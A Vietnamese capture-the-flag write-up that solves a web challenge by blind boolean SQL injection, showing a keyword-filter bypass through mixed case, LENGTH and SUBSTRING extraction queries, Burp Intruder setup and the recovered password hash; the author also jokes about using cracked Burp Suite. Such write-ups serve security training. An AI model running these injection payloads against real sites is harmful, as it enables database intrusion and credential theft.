### What is password?

Hint: 
* SQLi
* table: user
* username: minhdz
* password('a-z',0-9)

Bắt đầu thử thách. Họ cho mình 1 trang web view profiles

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/1.png" width="666px" align="center">

Thay thế bằng các giá trị id khác, các id phù hợp là 1->6. Còn các giá trị khác thì server báo "User not found"

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/3.png" width="666px" align="center">

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/4.png" width="666px" align="center">

Chúng ta thử chèn 1 số payload SQLi xem thế nào

```sql
1'--
1"--
```

Lỗi "No SQLi" hay "Error executing query"

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/5.png" width="666px" align="center">

Thử tiếp 1 số payload

```sql
1" and "1"="1
1' and '1'='1
1" anD "1"="1
1' anD '1'='1
```

Ồ, payload `1' anD '1'='1` đã vượt qua được.
Ta thấy server đã lọc từ khóa and nhưng có phân biệt ký tự in hoa in thường nên từ khóa anD hay And, aND,.. vẫn được thực thi

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/6.png" width="666px" align="center">

Chúng ta đổi thành 1' anD '1'='2 thì server báo "User not found"

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/7.png" width="666px" align="center">

Điều kiện đúng và sai trả về 2 trạng thái web trả về khác nhau, xác định được lỗ hổng là SQL Blind Boolean Base

Trong gợi ý của bài có table: user và username: minhdz nên chúng ta sẽ suy luận password dựa vào trạng thái trả về của web

* Đưa vào Intruder của Burp Suite để tấn công từ điển

* Chúng ta nên thay đổi ký tự in hoa in thường ngẫu nhiên của các keyword để tránh bị filter


Đầu tiên chúng ta dùng hàm LENGTH để xác định độ dài của password

```sql
1' anD LEnGth((SeLEcT password From "user" whEre username='minhdz'))='1
```

Đổi ký tự ' ' thành '+' để dễ nhìn hơn

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/8.png" width="666px" align="center">

Set Payload type là Numbers rồi cho chạy từ 1 đến 50

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/9.png" width="666px" align="center">

Attack

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/10.png" width="666px" align="center">

Chúng ta thấy payload "32" có length khác so với các payload khác, đây chính là payload đúng. Xác định được độ dài password là 32

Tiếp theo chúng ta sử dụng hàm SUBSTRING hay SUBSTR (tùy vào cơ sở dữ liệu) để so sánh từng ký tự của password từ đó suy luận ra password 

```sql
1' anD SUBSTRing((SeLEcT password From "user" whEre username='minhdz'),1,1)='a

--or

1' anD SUBStr((SeLEcT password From "user" whEre username='minhdz'),1,1)='a
```

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/11.png" width="666px" align="center">

Set Payload type là Simple list và cho vào 1 list các ký tự từ a-z,0-9 để so sánh với password (như gợi ý của bài)

Attack

Tìm được ý tự đầu tiên của password là '0'

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/12.png" width="666px" align="center">

Ta có thể làm 32 lần SUBSTRING để lấy từng ký tự 1, hoặc dùng Cluster Bomb trong Burp Suite để quét 32 ký tự 1 lúc

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/13.png" width="666px" align="center">

Set payload 1 chạy từ 1-32, payload 2 có các ký tự a-z,0-9. Tổng số payload là 32*36=1152 dùng Burp Suite phiên bản thường quét hơi lâu đấy, Burp của tôi thì chạy nhanh ....burp crack mà :))

Start attack !!

<img src="https://github.com/themingw666/okay/blob/main/Week%208/images/14.png" width="666px" align="center">

Ta thấy ký tự đầu tiên là 0 và ký tự thứ 2 là 1.. từ đó chúng ta ghép lại được password

`0192023a7bbd73250516f069df18b500`













